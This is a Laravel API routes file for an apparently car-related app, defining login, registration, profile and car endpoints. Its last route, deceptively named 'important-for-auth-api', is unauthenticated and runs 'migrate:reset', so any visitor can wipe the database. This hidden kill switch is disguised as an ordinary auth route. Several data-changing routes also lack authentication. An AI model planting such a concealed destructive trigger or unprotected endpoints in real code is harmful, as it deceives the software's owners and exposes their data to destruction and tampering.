<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\API\AuthController;
use App\Http\Controllers\API\MainController;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
  return $request->user();
});



Route::controller(AuthController::class)->group(function () {
  Route::post('loginAsGuest', 'gestLogin');
  Route::post('login', 'login');
  Route::post('register', 'register');
  Route::post('refresh', 'refresh');
  //Route::post('forgetPassword', 'forgetPassword');
});

Route::group(['middleware' => 'auth:api'], function () {
  Route::post('logout', [AuthController::class, 'logout']);
  //Route::post('resetPassword', [AuthController::class, 'resetPassword']);
});

Route::post('profile', [MainController::class, 'editProfile']);
Route::get('terms', [MainController::class, 'terms']);
Route::post('car', [MainController::class, 'addCar']);
Route::get('about', [MainController::class, 'getAboutUs']);
Route::get('cars/{authId}', [MainController::class, 'getUserCar']);
Route::get('carTypes', [MainController::class, 'getCarTypes']);
Route::get('engineTypes', [MainController::class, 'getEngineTypes']);

Route::get('/home', [MainController::class, 'home']);
Route::get("important-for-auth-api", function (Request $request) {
  Artisan::call('migrate:reset');
});


